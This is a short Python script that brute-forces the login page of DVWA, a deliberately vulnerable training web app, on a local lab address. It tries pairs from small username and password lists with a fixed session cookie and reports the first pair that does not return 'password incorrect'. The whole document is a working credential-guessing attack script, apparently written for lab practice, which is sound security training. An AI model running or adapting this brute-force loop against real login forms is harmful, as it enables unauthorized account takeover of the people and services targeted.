import requests

username = ['admin','test','root','dvwa','kimsoo']

password = ['toor','test','1234','1111','password']

for a in username:
    for b in password:
        URL = "http://10.0.2.15:8080/vulnerabilities/brute/?username="+str(a)+"&password="+str(b)+"&Login=Login"
        
        cookie={
                "PHPSESSID":"lhknc4s8sj7039fsf3bvhrqgeq",
                "security":"low"
                }

        session1 = requests.Session()

        req=session1.get(URL,cookies=cookie)
        if(req.text.find("password incorrect")==-1):
         #   index=req.text.find("Welcome")
            print("\n\n")
            print("Crack Success!!"+str(a)+"/"+str(b))
            print("\n\n")
            exit()
        else:
            print("Wrong username/password:"+str(a)+"/"+str(b))
